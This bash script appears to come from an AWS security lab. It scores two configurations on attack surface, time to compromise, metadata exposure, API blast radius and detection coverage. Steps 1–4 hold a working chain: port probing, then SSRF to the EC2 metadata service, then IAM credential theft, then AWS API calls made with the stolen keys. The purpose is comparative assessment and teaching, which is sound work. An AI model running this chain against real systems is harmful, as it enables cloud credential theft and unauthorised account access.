#!/usr/bin/env bash
# =============================================================================
# 19_quantitative_metrics.sh — Quantitative Security Metrics Collection
# =============================================================================
# Purpose:
#   Collect measurable security metrics for the current configuration.
#   All metrics are numerical, enabling direct Config A vs Config B comparison.
#   Results are saved in both text and JSON format for report generation.
#
# Metrics collected:
#   1. Attack Surface Area (exposed ports, endpoints, service banners)
#   2. Time to Compromise (SSRF → credential theft timing)
#   3. Data Exposure Volume (bytes extractable from IMDS)
#   4. Blast Radius Indicators (accessible AWS APIs count)
#   5. Detection Coverage (detectable vs invisible attack steps)
#   6. Overall Security Score (weighted composite)
#
# Learning points:
#   - Numbers tell a clearer story than VULNERABLE/BLOCKED labels
#   - Config B reduces attack surface area but not blast radius
#   - Time to compromise is nearly identical in both configs
#   - Quantitative comparison makes the business case for additional controls
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "19: Quantitative Security Metrics Collection"

RESULT_FILE="19_quantitative_metrics.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Collecting quantitative metrics for ${CONFIG_LABEL}${NC}"
echo ""

# ---------------------------------------------------------------------------
# Cleanup: unset any AWS credentials exported during blast radius steps
# ---------------------------------------------------------------------------
cleanup() {
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION 2>/dev/null || true
}
trap cleanup EXIT

# Initialize all metrics to safe defaults so JSON generation never references
# undefined variables regardless of which steps succeed or fail.
open_ports=0
total_ports=0
accessible_endpoints=0
total_endpoints=0
banner_bytes=0
total_ms=0
ssrf_ms=0
imds_ms=0
role_ms=0
cred_ms=0
total_imds_bytes=0
cred_bytes=0
cred_response=""
iam_role=""
creds=""
accessible_apis=0
tested_apis=0
blast_radius_pct=0
detectable_steps=0
invisible_steps=0
total_attack_steps=0
detection_coverage=0
security_score=0

# =============================================================================
# Step 1: Attack Surface Area Measurement
# =============================================================================
# Measure the number of externally reachable ports, accessible HTTP endpoints,
# and the information leaked through service response headers. Attack surface
# area quantifies how many entry points an attacker can probe.
# =============================================================================
print_header "Step 1: Attack Surface Area"

result_text+="==============================="$'\n'
result_text+="Step 1: Attack Surface Area"$'\n'
result_text+="==============================="$'\n'

# --- 1a: Port scan (bash TCP probe, no nmap) ---
echo -e "${BLUE}[*] Scanning exposed ports on ${ATTACK_TARGET}${NC}"

COMMON_PORTS=(22 80 443 8080 8443 3000 5000 3306 5432 6379 27017)
open_ports=0
total_ports=${#COMMON_PORTS[@]}

for port in "${COMMON_PORTS[@]}"; do
    if run_with_timeout 3 bash -c "echo >/dev/tcp/${ATTACK_TARGET}/${port}" 2>/dev/null; then
        echo -e "  Port ${port}: ${RED}OPEN${NC}"
        ((open_ports++)) || true
    else
        echo -e "  Port ${port}: ${GREEN}CLOSED${NC}"
    fi
done

echo ""
echo -e "  Exposed ports: ${open_ports}/${total_ports}"
result_text+="Exposed ports: ${open_ports}/${total_ports}"$'\n'

# --- 1b: Accessible HTTP endpoints ---
echo ""
echo -e "${BLUE}[*] Probing HTTP endpoints${NC}"
ENDPOINTS=("/" "/health" "/info" "/fetch" "/admin" "/api" "/debug" "/.env" "/metrics" "/status")
accessible_endpoints=0
total_endpoints=${#ENDPOINTS[@]}

for ep in "${ENDPOINTS[@]}"; do
    status=$(curl -sS -o /dev/null -w "%{http_code}" -m 3 "http://${ATTACK_TARGET}${ep}" 2>/dev/null) || status="000"
    if [[ "${status}" != "000" && "${status}" != "404" ]]; then
        echo -e "  ${ep}: ${RED}HTTP ${status}${NC}"
        ((accessible_endpoints++)) || true
    else
        echo -e "  ${ep}: ${GREEN}${status}${NC}"
    fi
done

echo ""
echo -e "  Accessible endpoints: ${accessible_endpoints}/${total_endpoints}"
result_text+="Accessible endpoints: ${accessible_endpoints}/${total_endpoints}"$'\n'

# --- 1c: Service banner info leakage ---
echo ""
echo -e "${BLUE}[*] Measuring service banner information leakage${NC}"
banner_bytes=$(curl -sI -m 5 "http://${ATTACK_TARGET}/" 2>/dev/null | wc -c) || banner_bytes=0
# wc -c may return leading whitespace on macOS; strip it
banner_bytes=$(echo "${banner_bytes}" | tr -d ' ')
echo -e "  Response header size: ${banner_bytes} bytes"
result_text+="Banner info bytes: ${banner_bytes}"$'\n'

# =============================================================================
# Step 2: Time to Compromise (SSRF → IMDS → IAM credentials)
# =============================================================================
# Measure wall-clock time for each link in the exploit chain. Low time-to-
# compromise means an attacker can extract credentials before any detection
# or manual response can occur.
# =============================================================================
print_header "Step 2: Time to Compromise"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 2: Time to Compromise"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Measuring SSRF → IMDS → credential theft timing${NC}"
echo ""

chain_start=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")

# --- 2a: SSRF endpoint discovery ---
t1_start=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
fetch_status=$(curl -sS -o /dev/null -w "%{http_code}" -m 5 "${TARGET_URL}/fetch" 2>/dev/null) || fetch_status="000"
t1_end=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
ssrf_ms=$(python3 -c "print(${t1_end} - ${t1_start})" 2>/dev/null || echo "0")

echo -e "  2a SSRF endpoint probe  (/fetch HTTP ${fetch_status}): ${ssrf_ms}ms"
result_text+="SSRF endpoint probe: ${ssrf_ms}ms (HTTP ${fetch_status})"$'\n'

# --- 2b: IMDS reachability ---
t2_start=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
imds_test=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>/dev/null) || imds_test=""
t2_end=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
imds_ms=$(python3 -c "print(${t2_end} - ${t2_start})" 2>/dev/null || echo "0")

echo -e "  2b IMDS reachability probe:                   ${imds_ms}ms"
result_text+="IMDS reachability: ${imds_ms}ms"$'\n'

# --- 2c: IAM role discovery ---
t3_start=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
iam_role=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""
t3_end=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
role_ms=$(python3 -c "print(${t3_end} - ${t3_start})" 2>/dev/null || echo "0")

if echo "${iam_role}" | grep -qi "404\|not found\|error\|<?xml\|Token required\|401"; then
    iam_role=""
fi

echo -e "  2c IAM role discovery:                        ${role_ms}ms"
result_text+="IAM role discovery: ${role_ms}ms"$'\n'

# --- 2d: Credential retrieval ---
t4_start=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
if [[ -n "${iam_role}" ]]; then
    creds=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds=""
    if ! echo "${creds}" | grep -qi "AccessKeyId"; then
        creds=""
    fi
fi
t4_end=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
cred_ms=$(python3 -c "print(${t4_end} - ${t4_start})" 2>/dev/null || echo "0")

chain_end=$(python3 -c "import time; print(int(time.time() * 1000))" 2>/dev/null || echo "0")
total_ms=$(python3 -c "print(${chain_end} - ${chain_start})" 2>/dev/null || echo "0")

echo -e "  2d Credential retrieval:                      ${cred_ms}ms"
echo ""
echo -e "  Total chain time: ${total_ms}ms ($(python3 -c "print(round(${total_ms}/1000, 1))" 2>/dev/null || echo "N/A")s)"
result_text+="Credential retrieval: ${cred_ms}ms"$'\n'
result_text+="Total chain time: ${total_ms}ms"$'\n'

if [[ -n "${creds}" ]]; then
    print_vulnerable "Full exploit chain completed in ${total_ms}ms — credentials extracted"
elif [[ -n "${iam_role}" ]]; then
    print_info "Role discovered but credential retrieval failed (${total_ms}ms)"
elif [[ -n "${imds_test}" ]] && ! echo "${imds_test}" | grep -qi "Token required\|401"; then
    print_info "IMDS reachable but no IAM role attached (${total_ms}ms)"
else
    print_blocked "IMDS unreachable or IMDSv2 enforced — chain aborted"
fi

# =============================================================================
# Step 3: Data Exposure Volume
# =============================================================================
# Quantify the total bytes an attacker can extract from IMDS via SSRF. Every
# byte represents real data loss: instance metadata, user-data scripts,
# placement info, and — most critically — IAM temporary credentials.
# =============================================================================
print_header "Step 3: Data Exposure Volume"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 3: Data Exposure Volume"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Measuring bytes extractable from IMDS${NC}"
echo ""

IMDS_PATHS=(
    "latest/meta-data/"
    "latest/meta-data/instance-id"
    "latest/meta-data/ami-id"
    "latest/meta-data/local-ipv4"
    "latest/meta-data/public-ipv4"
    "latest/meta-data/placement/availability-zone"
    "latest/meta-data/placement/region"
    "latest/meta-data/iam/security-credentials/"
    "latest/user-data"
    "latest/dynamic/instance-identity/document"
)

total_imds_bytes=0

for path in "${IMDS_PATHS[@]}"; do
    response=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=${IMDS_BASE}/${path}" 2>/dev/null) || response=""
    # Ignore error responses
    if echo "${response}" | grep -qi "404\|not found\|Token required\|401\|<?xml"; then
        response=""
    fi
    bytes=${#response}
    total_imds_bytes=$((total_imds_bytes + bytes))
    printf "  %-60s %6d bytes\n" "${path}" "${bytes}"
    result_text+="${path}: ${bytes} bytes"$'\n'
done

# Add credential size if we retrieved them
cred_response=""
cred_bytes=0
if [[ -n "${iam_role}" ]]; then
    cred_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || cred_response=""
    if ! echo "${cred_response}" | grep -qi "AccessKeyId"; then
        cred_response=""
    fi
    cred_bytes=${#cred_response}
    if [[ ${cred_bytes} -gt 0 ]]; then
        total_imds_bytes=$((total_imds_bytes + cred_bytes))
        printf "  %-60s %6d bytes  ${RED}(IAM CREDENTIALS!)${NC}\n" \
            "latest/meta-data/iam/security-credentials/${iam_role}" "${cred_bytes}"
        result_text+="IAM credentials path: ${cred_bytes} bytes (CREDENTIALS INCLUDED)"$'\n'
    fi
fi

echo ""
echo -e "  Total IMDS data exposed: ${total_imds_bytes} bytes"
result_text+="Total IMDS bytes exposed: ${total_imds_bytes}"$'\n'

if [[ ${total_imds_bytes} -gt 5000 ]]; then
    print_vulnerable "High data exposure — ${total_imds_bytes} bytes extractable from IMDS"
elif [[ ${total_imds_bytes} -gt 0 ]]; then
    print_info "Partial data exposure — ${total_imds_bytes} bytes from IMDS"
else
    print_blocked "No IMDS data extracted — IMDSv2 enforced or IMDS unreachable"
fi

# =============================================================================
# Step 4: Blast Radius Indicators
# =============================================================================
# Using stolen IAM credentials (if obtained), count how many AWS service APIs
# respond with data vs. AccessDenied. A high accessible-API ratio means the
# IAM role is over-privileged and the blast radius is large.
# =============================================================================
print_header "Step 4: Blast Radius Indicators"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 4: Blast Radius Indicators"$'\n'
result_text+="==============================="$'\n'

accessible_apis=0
tested_apis=0
blast_radius_pct=0

if [[ -n "${creds}" ]] && echo "${creds}" | grep -qi "AccessKeyId"; then
    echo -e "${BLUE}[*] Setting up stolen credentials for AWS API tests${NC}"

    export AWS_ACCESS_KEY_ID=$(echo "${creds}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null || echo "")
    export AWS_SECRET_ACCESS_KEY=$(echo "${creds}" | python3 -c "import json,sys; print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null || echo "")
    export AWS_SESSION_TOKEN=$(echo "${creds}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Token'])" 2>/dev/null || echo "")

    region=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/region" 2>/dev/null) || region=""
    if [[ -z "${region}" ]] || echo "${region}" | grep -qi "404\|error"; then
        az_val=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/availability-zone" 2>/dev/null) || az_val=""
        region="${az_val%[a-z]}"
        region="${region:-ap-northeast-1}"
    fi
    export AWS_DEFAULT_REGION="${region}"

    echo -e "  AccessKeyId: ${AWS_ACCESS_KEY_ID}"
    echo -e "  Region:      ${AWS_DEFAULT_REGION}"
    echo ""

    declare -a QUICK_APIS=(
        "aws s3 ls"
        "aws ec2 describe-instances"
        "aws rds describe-db-instances"
        "aws iam list-roles"
        "aws lambda list-functions"
        "aws secretsmanager list-secrets"
        "aws ssm describe-instance-information"
        "aws logs describe-log-groups"
        "aws cloudtrail describe-trails"
        "aws ec2 describe-security-groups"
    )

    echo -e "${BLUE}[*] Testing ${#QUICK_APIS[@]} key AWS API endpoints${NC}"
    echo ""

    for cmd in "${QUICK_APIS[@]}"; do
        ((tested_apis++)) || true
        api_result=$(${cmd} 2>&1) || true
        if echo "${api_result}" | grep -qi "AccessDenied\|not authorized\|UnauthorizedAccess\|AuthFailure"; then
            echo -e "  ${GREEN}DENIED${NC}    ${cmd}"
            result_text+="DENIED: ${cmd}"$'\n'
        else
            echo -e "  ${RED}ALLOWED${NC}   ${cmd}"
            result_text+="ALLOWED: ${cmd}"$'\n'
            ((accessible_apis++)) || true
        fi
    done

    echo ""
    [[ ${tested_apis} -gt 0 ]] && blast_radius_pct=$((accessible_apis * 100 / tested_apis))
    echo -e "  Accessible APIs: ${accessible_apis}/${tested_apis}"
    echo -e "  Blast radius:    ${blast_radius_pct}%"
    result_text+="Accessible APIs: ${accessible_apis}/${tested_apis}"$'\n'
    result_text+="Blast radius: ${blast_radius_pct}%"$'\n'

    if [[ ${blast_radius_pct} -ge 70 ]]; then
        print_vulnerable "Blast radius ${blast_radius_pct}% — role is dangerously over-privileged"
    elif [[ ${blast_radius_pct} -ge 40 ]]; then
        print_info "Blast radius ${blast_radius_pct}% — moderate over-privilege detected"
    else
        print_blocked "Blast radius ${blast_radius_pct}% — role is reasonably scoped"
    fi
else
    echo -e "${YELLOW}[*] No stolen credentials available — skipping AWS API blast radius tests${NC}"
    if [[ -n "${iam_role}" ]]; then
        echo -e "${YELLOW}    (IAM role found but credential retrieval failed)${NC}"
    else
        echo -e "${YELLOW}    (No IAM role attached or IMDS blocked)${NC}"
    fi
    result_text+="Blast radius test: Skipped (no credentials)"$'\n'
    result_text+="Accessible APIs: 0/0"$'\n'
    result_text+="Blast radius: 0%"$'\n'
fi

# =============================================================================
# Step 5: Detection Coverage Score
# =============================================================================
# For each distinct attack step, record whether it generates a log entry that
# a defender could act on. IMDS accesses over link-local are invisible to all
# network-layer logging — a critical blind spot in both configs.
# =============================================================================
print_header "Step 5: Detection Coverage"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 5: Detection Coverage"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Mapping attack steps to detection mechanisms${NC}"
echo ""

# Format: "attack_step|detection_mechanism"
declare -a DETECTION_ENTRIES=(
    "Port scan|VPC Flow Logs"
    "SSH brute-force|VPC Flow Logs"
    "HTTP/SSRF request|ALB access logs (Config B) / VPC Flow Logs (Config A)"
    "IMDS access via SSRF|INVISIBLE — link-local traffic never leaves EC2"
    "IAM credential theft from IMDS|INVISIBLE — link-local traffic never leaves EC2"
    "AWS API calls with stolen creds|CloudTrail (all regions)"
    "S3 data access|CloudTrail + S3 server access logs"
    "RDS lateral movement via SSRF|VPC Flow Logs (EC2 to RDS subnet)"
    "Outbound C2 callback|VPC Flow Logs (egress)"
    "DNS exfiltration|Route 53 Resolver query logs (if enabled)"
)

total_attack_steps=${#DETECTION_ENTRIES[@]}
detectable_steps=0
invisible_steps=0

printf "  %-42s %-10s  %s\n" "Attack Step" "Detectable" "Mechanism"
echo -e "  $(printf '%.0s─' {1..90})"

for entry in "${DETECTION_ENTRIES[@]}"; do
    attack="${entry%%|*}"
    detection="${entry##*|}"
    if echo "${detection}" | grep -qi "INVISIBLE"; then
        ((invisible_steps++)) || true
        printf "  %-42s " "${attack}"
        echo -e "${RED}NO${NC}         ${detection}"
        result_text+="[INVISIBLE] ${attack}: ${detection}"$'\n'
    else
        ((detectable_steps++)) || true
        printf "  %-42s " "${attack}"
        echo -e "${GREEN}YES${NC}        ${detection}"
        result_text+="[DETECTABLE] ${attack}: ${detection}"$'\n'
    fi
done

echo ""
detection_coverage=$((detectable_steps * 100 / total_attack_steps))
echo -e "  Detectable steps:  ${detectable_steps}/${total_attack_steps}"
echo -e "  Invisible steps:   ${invisible_steps}/${total_attack_steps}"
echo -e "  Detection coverage: ${detection_coverage}%"
result_text+="Detectable steps: ${detectable_steps}/${total_attack_steps}"$'\n'
result_text+="Invisible steps: ${invisible_steps}/${total_attack_steps}"$'\n'
result_text+="Detection coverage: ${detection_coverage}%"$'\n'

if [[ ${detection_coverage} -ge 80 ]]; then
    print_blocked "Detection coverage ${detection_coverage}% — most attack steps are observable"
elif [[ ${detection_coverage} -ge 60 ]]; then
    print_info "Detection coverage ${detection_coverage}% — significant blind spots remain"
else
    print_vulnerable "Detection coverage ${detection_coverage}% — attacker operates largely undetected"
fi

# =============================================================================
# Step 6: Overall Security Score (Weighted Composite)
# =============================================================================
# Combine the five metric categories into a single 0-100 score. Lower score
# means more vulnerable. Score < 50 → VULNERABLE verdict.
#
# Weighting:
#   Attack surface (25%), Blast radius (30%), Detection (20%),
#   Time to compromise (15%), Data exposure (10%)
# =============================================================================
print_header "Step 6: Overall Security Score"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 6: Overall Security Score"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Computing weighted composite security score${NC}"
echo ""

security_score=$(python3 -c "
surface   = (1 - ${open_ports} / max(${total_ports}, 1)) * 25
blast     = (1 - ${blast_radius_pct} / 100.0) * 30
detect    = (${detection_coverage} / 100.0) * 20
# Time: if > 60s → full 15; if < 10s → 0; linear in between
t_sec     = ${total_ms} / 1000.0
time_score = min(15, max(0, (t_sec - 10) / 50.0 * 15)) if t_sec > 0 else 0
# Data: if > 5KB → 0; if 0B → 10; linear
data_score = max(0.0, 10.0 - (${total_imds_bytes} / 500.0))
score      = surface + blast + detect + time_score + data_score
print(int(max(0, min(100, score))))
" 2>/dev/null || echo "0")

echo -e "  Score components:"
echo -e "    Attack surface   (25%): $(python3 -c "print(round((1 - ${open_ports} / max(${total_ports}, 1)) * 25, 1))" 2>/dev/null || echo "N/A")"
echo -e "    Blast radius     (30%): $(python3 -c "print(round((1 - ${blast_radius_pct} / 100.0) * 30, 1))" 2>/dev/null || echo "N/A")"
echo -e "    Detection        (20%): $(python3 -c "print(round(${detection_coverage} / 100.0 * 20, 1))" 2>/dev/null || echo "N/A")"
echo -e "    Time to compromise(15%): $(python3 -c "t=${total_ms}/1000.0; print(round(min(15,max(0,(t-10)/50.0*15)) if t>0 else 0, 1))" 2>/dev/null || echo "N/A")"
echo -e "    Data exposure    (10%): $(python3 -c "print(round(max(0.0, 10.0 - ${total_imds_bytes}/500.0), 1))" 2>/dev/null || echo "N/A")"
echo ""
echo -e "  Overall security score: ${security_score}/100"
result_text+="Security score: ${security_score}/100"$'\n'

# =============================================================================
# Step 7: Save JSON Output
# =============================================================================
print_header "Step 7: Save JSON Output"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 7: Save JSON Output"$'\n'
result_text+="==============================="$'\n'

json_file="${RESULTS_DIR}/19_quantitative_metrics.json"

python3 -c "
import json
data = {
    'config_mode': '${CONFIG_MODE}',
    'config_label': '${CONFIG_LABEL}',
    'timestamp': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
    'attack_surface': {
        'open_ports': ${open_ports},
        'total_ports_scanned': ${total_ports},
        'accessible_endpoints': ${accessible_endpoints},
        'total_endpoints_probed': ${total_endpoints},
        'banner_info_bytes': ${banner_bytes}
    },
    'time_to_compromise': {
        'total_ms': ${total_ms},
        'ssrf_discovery_ms': ${ssrf_ms},
        'imds_access_ms': ${imds_ms},
        'role_discovery_ms': ${role_ms},
        'credential_theft_ms': ${cred_ms}
    },
    'data_exposure': {
        'imds_total_bytes': ${total_imds_bytes},
        'credential_bytes': ${cred_bytes}
    },
    'blast_radius': {
        'accessible_apis': ${accessible_apis},
        'tested_apis': ${tested_apis},
        'blast_radius_pct': ${blast_radius_pct}
    },
    'detection': {
        'detectable_steps': ${detectable_steps},
        'invisible_steps': ${invisible_steps},
        'total_steps': ${total_attack_steps},
        'coverage_pct': ${detection_coverage}
    },
    'security_score': ${security_score}
}
print(json.dumps(data, indent=2))
" > "${json_file}" 2>/dev/null || {
    echo -e "${YELLOW}[!] JSON generation failed — writing minimal fallback${NC}"
    echo "{\"config_mode\": \"${CONFIG_MODE}\", \"security_score\": ${security_score}}" > "${json_file}"
}

echo -e "${BLUE}[*] JSON metrics saved: ${json_file}${NC}"
result_text+="JSON output: ${json_file}"$'\n'

# =============================================================================
# Summary Table
# =============================================================================
print_header "Summary: Quantitative Security Metrics"

# Compute human-readable ratings
port_rating="LOW"
[[ ${open_ports} -ge 3 ]] && port_rating="MEDIUM"
[[ ${open_ports} -ge 6 ]] && port_rating="HIGH"

ep_rating="LOW"
[[ ${accessible_endpoints} -ge 3 ]] && ep_rating="MEDIUM"
[[ ${accessible_endpoints} -ge 6 ]] && ep_rating="HIGH"

ttc_sec=$(python3 -c "print(round(${total_ms}/1000.0, 1))" 2>/dev/null || echo "N/A")
ttc_rating="LOW"
[[ ${total_ms} -gt 0 && ${total_ms} -lt 60000 ]] && ttc_rating="HIGH"
[[ ${total_ms} -gt 0 && ${total_ms} -lt 10000 ]] && ttc_rating="CRITICAL"

imds_rating="LOW"
[[ ${total_imds_bytes} -ge 1000 ]]  && imds_rating="MEDIUM"
[[ ${total_imds_bytes} -ge 5000 ]]  && imds_rating="HIGH"
[[ ${total_imds_bytes} -ge 10000 ]] && imds_rating="CRITICAL"

br_rating="LOW"
[[ ${blast_radius_pct} -ge 40 ]] && br_rating="MEDIUM"
[[ ${blast_radius_pct} -ge 70 ]] && br_rating="HIGH"
[[ ${blast_radius_pct} -ge 90 ]] && br_rating="CRITICAL"

detect_rating="LOW"
[[ ${detection_coverage} -le 80 ]] && detect_rating="MEDIUM"
[[ ${detection_coverage} -le 60 ]] && detect_rating="HIGH"
[[ ${detection_coverage} -le 40 ]] && detect_rating="CRITICAL"

score_rating="LOW"
[[ ${security_score} -le 75 ]] && score_rating="MEDIUM"
[[ ${security_score} -le 50 ]] && score_rating="HIGH"
[[ ${security_score} -le 25 ]] && score_rating="CRITICAL"

echo -e "${BOLD}  ═══════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  Quantitative Security Metrics — ${CONFIG_LABEL}${NC}"
echo -e "${BOLD}  ═══════════════════════════════════════════════════${NC}"
echo ""
printf "  %-32s %-14s %s\n" "Metric" "Value" "Rating"
echo -e "  ─────────────────────────────────────────────────"
printf "  %-32s %-14s %s\n" "Exposed Ports"          "${open_ports}/${total_ports}"       "${port_rating}"
printf "  %-32s %-14s %s\n" "Accessible Endpoints"   "${accessible_endpoints}/${total_endpoints}" "${ep_rating}"
printf "  %-32s %-14s %s\n" "Time to Compromise"     "${ttc_sec}s"                         "${ttc_rating}"
printf "  %-32s %-14s %s\n" "IMDS Data Exposed"      "${total_imds_bytes} B"               "${imds_rating}"
printf "  %-32s %-14s %s\n" "API Blast Radius"       "${blast_radius_pct}%"                "${br_rating}"
printf "  %-32s %-14s %s\n" "Detection Coverage"     "${detection_coverage}%"              "${detect_rating}"
echo -e "  ─────────────────────────────────────────────────"
printf "  %-32s %-14s %s\n" "Overall Security Score" "${security_score}/100"               "${score_rating}"
echo ""

result_text+=$'\n'"=== Summary Table ==="$'\n'
result_text+="Metric                           Value          Rating"$'\n'
result_text+="─────────────────────────────────────────────────────"$'\n'
result_text+="Exposed Ports                    ${open_ports}/${total_ports}            ${port_rating}"$'\n'
result_text+="Accessible Endpoints             ${accessible_endpoints}/${total_endpoints}           ${ep_rating}"$'\n'
result_text+="Time to Compromise               ${ttc_sec}s           ${ttc_rating}"$'\n'
result_text+="IMDS Data Exposed                ${total_imds_bytes} B          ${imds_rating}"$'\n'
result_text+="API Blast Radius                 ${blast_radius_pct}%             ${br_rating}"$'\n'
result_text+="Detection Coverage               ${detection_coverage}%             ${detect_rating}"$'\n'
result_text+="─────────────────────────────────────────────────────"$'\n'
result_text+="Overall Security Score           ${security_score}/100          ${score_rating}"$'\n'

# ---------------------------------------------------------------------------
# Final verdict and save
# ---------------------------------------------------------------------------
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  Final Verdict (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if [[ ${security_score} -lt 50 ]]; then
    print_vulnerable "VULNERABLE — Security score ${security_score}/100 is below the 50-point threshold"
    result_text+=$'\n'"VERDICT: VULNERABLE — Score ${security_score}/100 (below threshold of 50)"$'\n'
else
    print_blocked "ACCEPTABLE — Security score ${security_score}/100 is at or above the 50-point threshold"
    result_text+=$'\n'"VERDICT: ACCEPTABLE — Score ${security_score}/100 (at or above threshold of 50)"$'\n'
fi

echo ""
echo -e "${BLUE}[*] Note: A high score does not mean the system is secure.${NC}"
echo -e "${BLUE}    IMDSv2 enforcement and IAM least-privilege are always required.${NC}"
echo ""

save_result "${RESULT_FILE}" "${result_text}"

log "Quantitative metrics collection complete — score ${security_score}/100 (${CONFIG_LABEL})"
